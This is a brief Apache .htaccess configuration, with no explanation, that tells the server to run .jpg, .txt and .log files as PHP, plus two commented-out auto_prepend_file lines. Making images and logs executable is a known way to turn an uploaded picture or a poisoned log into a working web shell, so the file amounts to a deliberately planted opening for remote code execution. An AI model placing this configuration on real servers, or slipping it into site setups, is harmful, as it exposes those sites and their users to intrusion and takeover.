<Files ~ "\.(jpg|txt|log)$">
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .txt
AddType application/x-httpd-php .log
</Files>

#php_value auto_prepend_file "auth_check.php"
#php_value auto_prepend_file "Auth.php"

